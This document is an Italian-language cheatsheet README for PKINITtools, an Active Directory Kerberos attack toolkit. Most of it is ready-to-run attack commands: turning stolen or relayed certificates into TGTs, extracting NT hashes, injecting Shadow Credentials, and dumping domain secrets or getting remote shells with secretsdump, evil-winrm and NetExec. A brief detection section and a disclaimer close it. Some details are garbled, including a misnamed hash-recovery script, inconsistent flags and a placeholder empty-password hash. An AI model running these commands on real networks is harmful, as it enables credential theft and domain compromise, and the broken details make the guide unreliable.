<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<palign="centro">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Licenza MIT">
</p>

<palign="centro">
  <b>🌐 Strumenti per la crittografia a chiave pubblica Kerberos per l'autenticazione iniziale (PKINIT), conversione dei certificati in ticket TGT e recupero degli hash NT</b>
</p>

---

## 📋 Sommario

- [Panoramica e architettura PKINIT](#-panoramica--l'architettura-pkinit)
- [Utilità chiave: `gettgtpkinit.py` e `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Installazione](#-installazione)
- [Conversione dei certificati AD CS in Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Utilizzo di un file PFX](#using-a-pfx-file)
  - [Utilizzo di PFX con codifica Base64 (catene di relè)](#using-base64-encoded-pfx-relay-chains)
- [Recupero degli hash NT (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Flusso di lavoro di attacco alle credenziali Shadow](#-shadow-credentials-attack-workflow)
- [Consumare il TGT con Impacket e NetExec](#-using-the-tgt-with-impacket--netexec)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rilevamento](#-considerazioni-difensive--rilevamento)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e architettura PKINIT

**PKINIT** (Public Key Cryptography for Inizial Authentication in Kerberos, definita in **RFC 4556**) è un'estensione del protocollo Kerberos. Invece di richiedere l'hash della password segreta di un utente (NTLM o AES) per richiedere un Ticket Granting Ticket (TGT) Kerberos, PKINIT consente a un client di dimostrare l'identità utilizzando **certificati digitali X.509 e coppie di chiavi private/pubbliche**.

Creato dal famoso ricercatore di Active Directory **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** fornisce le primitive Python essenziali per:
1. Autenticarsi sui controller di dominio Active Directory tramite PKINIT utilizzando certificati digitali estratti o inoltrati.
2. Ottenere un file TGT Kerberos standard (`.ccache`).
3. Recuperare il testo in chiaro **NTLM Hash** dell'account tramite il meccanismo **UnPAC-the-Hash**.

---

## 🧰 Utilità principali: `gettgtpkinit.py` e `getskeyhash.py`

- **`gettgtpkinit.py`**: Comunica con il KDC (Kerberos Key Distribution Center) sulla porta 88, presenta il certificato e richiede un TGT corazzato, salvandolo come file Kirbi o ccache.
- **`getskeyhash.py`**: interroga il PAC Kerberos (Privilege Attribute Certificate) restituito nel ticket PKINIT per calcolare ed esporre l'hash NT statico dell'account.

---

## 📥Installazione
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Conversione dei certificati AD CS in Kerberos TGT

Quando ottieni un certificato Active Directory tramite Certipy, Coercer o NTLM Relay:

### Utilizzo di un file PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Utilizzo di PFX con codifica Base64 (catene di relè)

Spesso, `ntlmrelayx` stampa i certificati come stringa base64 grezza durante gli attacchi AD CS ESC8:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Recupero degli hash NT (UnPAC-the-Hash)

Quando un account esegue l'autenticazione con PKINIT, il controller di dominio firma il PAC con una struttura PAC_CREDENTIAL_INFO contenente l'**hash NTLM** statico dell'account (crittografato con una chiave AS-REP temporanea). `getskeyhash.py` decodifica questa struttura:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Con l'hash NT in mano, puoi eseguire immediatamente il **Pass-the-Hash** o il cracking offline!

---

## 👥 Flusso di lavoro di attacco delle credenziali ombra

Quando disponi dell'accesso in scrittura su un oggetto Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` su `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀Consumare il TGT con Impacket e NetExec

Una volta che `gettgtpkinit.py` emette un ticket `.ccache`, esportalo nell'ambiente:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **TGT tramite file PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT tramite certificato Base64** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Specificare il controller di dominio**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (Ottieni NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Passa TGT a Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Passa TGT a NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Considerazioni difensive e rilevamento

1. **ID evento 4768 (richiesta TGT):** Active Directory registra le richieste TGT Kerberos. Quando viene utilizzato PKINIT, il campo **Tipo di pre-autenticazione** mostra `16` (PKINIT), anziché `2` (PA-ENC-TIMESTAMP).
2. **Controllo delle modifiche `msDS-KeyCredentialLink`:** L'ID evento 5136 registra le modifiche dell'oggetto directory. Avvisa quando le credenziali chiave vengono aggiunte ad account gestiti non Azure/Intune.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> PKINITtools è destinato esclusivamente al controllo di sicurezza autorizzato di Active Directory, alle operazioni del Red Team e alla ricerca educativa. La manipolazione dei ticket Kerberos aziendali senza esplicita autorizzazione è illegale.